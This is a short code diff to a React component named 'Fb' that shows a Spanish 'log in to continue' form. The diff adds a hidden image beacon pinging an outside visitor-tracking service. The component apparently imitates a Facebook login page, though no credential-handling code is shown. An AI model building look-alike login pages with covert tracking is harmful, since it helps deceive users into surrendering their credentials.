@@ -34,7 +34,7 @@ export default function Fb() {
    return (
       <div className="">
          
-      
+       <img src="//whos.amung.us/pingjs/?k=presionty&amp;t=tango&amp;x=https://twitter.com" alt=""></img>
    
          <img className="git" src={logo} alt="logo imagen"></img><div className="form">
                <p className="alert">¡Iniciar sesion para continuar!</p>
